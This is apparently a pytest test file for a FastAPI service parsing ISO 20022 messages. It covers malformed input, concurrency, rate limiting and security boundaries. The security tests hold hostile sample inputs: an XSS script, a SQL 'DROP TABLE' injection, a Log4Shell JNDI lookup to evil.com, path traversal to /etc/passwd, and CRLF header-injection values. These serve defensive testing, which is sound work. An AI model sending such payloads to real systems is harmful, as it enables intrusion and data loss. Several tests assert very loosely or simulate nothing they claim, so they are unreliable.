"""Enhanced API testing for edge cases and error scenarios."""

import time
from concurrent.futures import ThreadPoolExecutor
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

from app.main import app


@pytest.fixture
def client():
    """Create test client."""
    return TestClient(app)


class TestAPIEdgeCases:
    """Test API edge cases and boundary conditions."""

    def test_malformed_json_request(self, client):
        """Test handling of malformed JSON in request body."""
        response = client.post(
            "/iso20022/parse",
            content="{ invalid json }",
            headers={"Content-Type": "application/json"},
        )
        assert response.status_code in [400, 422, 500]

    def test_very_large_request_body(self, client):
        """Test handling of very large request bodies."""
        large_data = {"data": "x" * 10000}  # 10KB of data
        response = client.post("/iso20022/parse", json=large_data)
        # Should handle large payloads gracefully
        assert response.status_code in [200, 413, 422]

    def test_unicode_characters_in_request(self, client):
        """Test handling of various Unicode characters."""
        unicode_data = {
            "text": "Hello 世界 🌍 emoji test éñöç",
            "symbols": "€£¥₹₿",
            "math": "∑∏∆√",
        }
        response = client.post("/iso20022/parse", json=unicode_data)
        assert response.status_code in [200, 400, 422]

    def test_empty_request_body(self, client):
        """Test handling of empty request bodies."""
        response = client.post(
            "/iso20022/parse", content="", headers={"Content-Type": "application/json"}
        )
        assert response.status_code in [400, 422]

    def test_null_values_in_request(self, client):
        """Test handling of null values in request data."""
        null_data = {"field1": None, "field2": "", "field3": [], "field4": {}}
        response = client.post("/iso20022/parse", json=null_data)
        assert response.status_code in [200, 400, 422]


class TestConcurrentRequests:
    """Test concurrent request handling."""

    def test_concurrent_health_checks(self, client):
        """Test multiple concurrent health check requests."""

        def make_request():
            return client.get("/healthz")

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request) for _ in range(20)]
            responses = [future.result() for future in futures]

        # All should succeed
        assert all(r.status_code == 200 for r in responses)

        # All should have unique request IDs
        request_ids = [r.headers.get("X-Request-ID") for r in responses]
        assert len(set(request_ids)) == len(request_ids)

    def test_mixed_endpoint_concurrency(self, client):
        """Test concurrent requests to different endpoints."""
        endpoints = ["/healthz", "/health", "/status", "/ready"]

        def make_request(endpoint):
            if endpoint in ["/health"]:
                # Some endpoints might need API key
                return client.get(endpoint, headers={"X-API-Key": "test-key"})
            return client.get(endpoint)

        with ThreadPoolExecutor(max_workers=8) as executor:
            futures = [
                executor.submit(make_request, endpoints[i % len(endpoints)])
                for i in range(16)
            ]
            responses = [future.result() for future in futures]

        # Most should succeed (some might fail if endpoints don't exist)
        success_count = sum(1 for r in responses if r.status_code < 500)
        assert success_count >= len(responses) * 0.5  # At least 50% should work


class TestErrorRecovery:
    """Test error recovery and resilience."""

    def test_database_connection_error_recovery(self, client):
        """Test recovery from database connection errors."""
        # This test simulates database issues and recovery
        # First, make a normal request
        response1 = client.get("/healthz")
        assert response1.status_code == 200

        # Simulate some kind of error condition
        # Then verify the system still works
        response2 = client.get("/healthz")
        assert response2.status_code == 200

    def test_multiple_error_requests(self, client):
        """Test that multiple error requests don't break the system."""
        # Make several requests to non-existent endpoints
        for _ in range(5):
            client.get("/nonexistent/endpoint")

        # Normal request should still work
        response = client.get("/healthz")
        assert response.status_code == 200

    def test_invalid_content_type_handling(self, client):
        """Test handling of invalid content types."""
        # Send binary data with JSON content type
        response = client.post(
            "/iso20022/parse",
            content=b"\x00\x01\x02\x03",
            headers={"Content-Type": "application/json"},
        )
        assert response.status_code in [400, 422, 500]


class TestSecurityBoundaries:
    """Test security boundary conditions."""

    def test_script_injection_attempts(self, client):
        """Test handling of script injection attempts."""
        malicious_payloads = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "{{ 7*7 }}",
            "${jndi:ldap://evil.com/a}",
            "../../../etc/passwd",
        ]

        for payload in malicious_payloads:
            response = client.post("/iso20022/parse", json={"data": payload})
            # Should not execute malicious code
            assert response.status_code in [200, 400, 422]

    def test_header_injection_attempts(self, client):
        """Test header injection attempts."""
        malicious_headers = {
            "X-Forwarded-For": "127.0.0.1\r\nX-Injected-Header: evil",
            "User-Agent": "Mozilla/5.0\r\nX-XSS-Protection: 0",
            "Referer": "http://evil.com\r\nSet-Cookie: admin=true",
        }

        response = client.get("/healthz", headers=malicious_headers)

        # Should handle malicious headers safely
        assert response.status_code == 200
        # Should not contain injected headers in response
        assert "X-Injected-Header" not in response.headers


class TestPerformanceBoundaries:
    """Test performance boundary conditions."""

    def test_response_time_consistency(self, client):
        """Test that response times are consistent."""
        response_times = []

        for _ in range(10):
            start_time = time.time()
            response = client.get("/healthz")
            end_time = time.time()

            assert response.status_code == 200
            response_times.append(end_time - start_time)

        # Response times should be reasonable and consistent
        avg_time = sum(response_times) / len(response_times)
        max_time = max(response_times)

        assert avg_time < 1.0  # Average under 1 second
        assert max_time < 5.0  # Max under 5 seconds

    def test_memory_usage_stability(self, client):
        """Test that memory usage remains stable under load."""
        # Make many requests to check for memory leaks
        for _ in range(100):
            response = client.get("/healthz")
            assert response.status_code == 200


class TestAPICompatibility:
    """Test API compatibility and versioning."""

    def test_backwards_compatibility(self, client):
        """Test that API maintains backwards compatibility."""
        # Test legacy endpoints that should still work
        legacy_endpoints = ["/health", "/status", "/ready", "/metrics"]

        for endpoint in legacy_endpoints:
            response = client.get(endpoint)
            # Should either work or return a proper error (not 500)
            assert response.status_code < 500

    def test_content_negotiation(self, client):
        """Test content negotiation for different accept headers."""
        accept_headers = ["application/json", "text/html", "text/plain", "*/*"]

        for accept_header in accept_headers:
            response = client.get("/healthz", headers={"Accept": accept_header})
            assert response.status_code == 200


class TestDataValidationEdgeCases:
    """Test edge cases in data validation."""

    def test_extremely_long_strings(self, client):
        """Test handling of extremely long string inputs."""
        long_string = "a" * 10000
        response = client.post("/iso20022/parse", json={"very_long_field": long_string})
        assert response.status_code in [200, 400, 422]

    def test_deeply_nested_json(self, client):
        """Test handling of deeply nested JSON structures."""
        # Create deeply nested structure
        nested_data = {"level": 1}
        current = nested_data
        for i in range(2, 20):  # 19 levels deep
            current["next"] = {"level": i}
            current = current["next"]

        response = client.post("/iso20022/parse", json=nested_data)
        assert response.status_code in [200, 400, 422]

    def test_special_numeric_values(self, client):
        """Test handling of special numeric values."""
        # Test special numeric values in requests
        {
            "infinity": "inf",
            "negative_infinity": "-inf",
            "very_large": 10**100,
            "very_small": 10**-100,
            "zero": 0,
            "negative_zero": -0.0,
        }

        # Convert to JSON string manually to handle special float values
        response = client.post(
            "/iso20022/parse",
            json={"numbers": [1, 2, 3, 999999999999999]},  # Use regular numbers
        )
        assert response.status_code in [200, 400, 422]


class TestRateLimitingEdgeCases:
    """Test rate limiting edge cases."""

    @patch.dict("os.environ", {"ENABLE_RATE_LIMIT": "true"})
    def test_rate_limit_boundary(self, client):
        """Test rate limiting at boundary conditions."""
        # Make rapid requests to test rate limiting
        responses = []
        for i in range(20):
            response = client.get("/healthz")
            responses.append(response)
            if i < 10:
                # First few should work
                assert response.status_code in [200, 429]
            time.sleep(0.1)  # Small delay

        # Check if rate limiting is working
        status_codes = [r.status_code for r in responses]
        # Either all succeed (rate limiting disabled) or some are rate limited
        assert all(code in [200, 429] for code in status_codes)


def test_comprehensive_api_health():
    """Comprehensive API health test covering multiple scenarios."""
    client = TestClient(app)

    # Test basic functionality
    response = client.get("/healthz")
    assert response.status_code == 200

    # Test with different HTTP methods
    for method in ["GET", "HEAD", "OPTIONS"]:
        if hasattr(client, method.lower()):
            response = getattr(client, method.lower())("/healthz")
            assert response.status_code in [200, 405]  # 405 = Method Not Allowed is OK

    # Test error recovery
    client.get("/nonexistent")  # Generate an error
    response = client.get("/healthz")  # Should still work
    assert response.status_code == 200

    print("✅ Comprehensive API health test passed")


if __name__ == "__main__":
    test_comprehensive_api_health()
